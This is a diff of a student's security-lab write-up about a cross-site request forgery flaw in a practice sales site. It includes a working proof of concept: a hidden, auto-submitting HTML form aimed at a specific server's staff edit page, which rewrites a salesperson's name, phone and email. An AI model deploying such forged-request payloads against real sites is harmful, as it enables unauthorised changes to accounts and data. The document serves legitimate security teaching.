@@ -63,18 +63,18 @@ Vulnerability #2: Cross-Site Request Forgery (CSRF)
 
 Description:
 This site is not configured correctly for CSRF protection. A hacker can submit a hidden form
-in the feedback page that alters the salesperson's information. When the site is configured propertly, this action is only for the administrator. In my demostration video, I show how to change information of Elizabeth Olson to Elizabeth Suzuki. When the Administrator follows the link, they submit the bad form. 
+in the feedback page that alters the salesperson's information. When the site is configured propertly, this action is only for the administrator. In my demostration video, I show how to change information of Ken Barker to Ken BAAAARRRLLER. When the Administrator follows the link, they submit the bad form. 
 ```
 <html>
     <head>
         <title>FAKE FORM</title>
     </head>
   <body onload="document.form.submit()">
-    <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=6" method="POST" name="form" style="display: none;" target="hidden_results" >
-      <input type="text" name="first_name" value="Elizabeth" />
-      <input type="text" name="last_name" value="Suzuki" />
-      <input type="text" name="phone" value="555-352-9604" />
-      <input type="text" name="email" value="suzuki@salesperson.com" />
+    <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5" method="POST" name="form" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="Ken" />
+      <input type="text" name="last_name" value="BAAAARRRLLER" />
+      <input type="text" name="phone" value="555-352-9654" />
+      <input type="text" name="email" value="kbarker@salesperson.com" />
     </form>
     <iframe name="hidden_results" style="display:   none;" ></iframe>
   </body>
@@ -82,10 +82,10 @@ in the feedback page that alters the salesperson's information. When the site is
 
 ```
 
-<img src="red-vuln2.gif">
+<img src="./redexploit2.gif">
 
 
 ## Notes
 
-Describe any challenges encountered while doing the work
+It was difficult to find the exploits, it took many tries and hours to perform the operations.
 
